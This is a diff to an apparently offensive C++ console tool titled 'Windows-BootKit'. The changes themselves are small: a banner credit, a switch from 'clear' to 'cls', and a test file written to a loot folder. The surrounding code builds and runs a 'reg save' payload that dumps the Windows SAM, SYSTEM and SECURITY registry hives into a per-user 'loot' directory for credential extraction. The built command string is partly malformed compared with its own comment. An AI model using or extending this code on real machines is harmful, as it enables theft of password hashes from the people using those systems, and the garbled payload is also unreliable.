@@ -7,7 +7,7 @@ using namespace termcolor;
 
 
 // Set variable 
-string banner = "-------------------------------------\n ______              _ _    _ _      \n(____  \\            | | |  / |_)_    \n ____)  ) ___   ___ | | | / / _| |_  \n|  __  ( / _ \\ / _ \\| | |< < | |  _) \n| |__)  ) |_| | |_| | | | \\ \\| | |__ \n|______/ \\___/ \\___/|_|_|  \\_)_|\\___)\n\n-------------------------------------";
+string banner = "-------------------------------------\n ______              _ _    _ _      \n(____  \\            | | |  / |_)_    \n ____)  ) ___   ___ | | | / / _| |_  \n|  __  ( / _ \\ / _ \\| | |< < | |  _) \n| |__)  ) |_| | |_| | | | \\ \\| | |__ \n|______/ \\___/ \\___/|_|_|  \\_)_|\\___)\n\nBy Perrtatter\nhttps://github.com/Perrtatter/Windows-BootKitn\n-------------------------------------";
 string bin_path = "C:/Windows/System32";
 string choice;
 bool running = true;
@@ -16,7 +16,7 @@ bool running = true;
 int clear_screen(){
 
     // Run command
-    system("clear");
+    system("cls");
 
     // Return 0 , cause is a int loop
     return 0;
@@ -105,6 +105,8 @@ int main(){
             // Dump SAM base ( payload : @echo off && mkdir loot/%USERNAME%_base_sam && cd loot/%USERNAME%_base_sam >NUL 2>&1 && reg save hklm\sam ./sam.save && reg save hklm\system ./system.save && reg save hklm\security ./security.save )
             string payload = "@echo off && " + bin_path + "/mkdir loot/" + "%" + "USERNAME" + "%_base_sam && " + bin_path + "/cd loot/" + "%" + "USERNAME" + "%_base_sam >NUL>&1 && " + bin_path + "/reg save hklm\\system ./system.save && " + bin_path + "/reg save hklm\\security.save";
             system(payload.c_str());
+
+            system("echo test > loot/test.txt");
 
             // Show loot export success message 
             cout << "[" << blue << "*" << reset << "] Loot exfiltrate as : " << blue << "'/loot/[PC-USERNAME]'" << reset << endl;
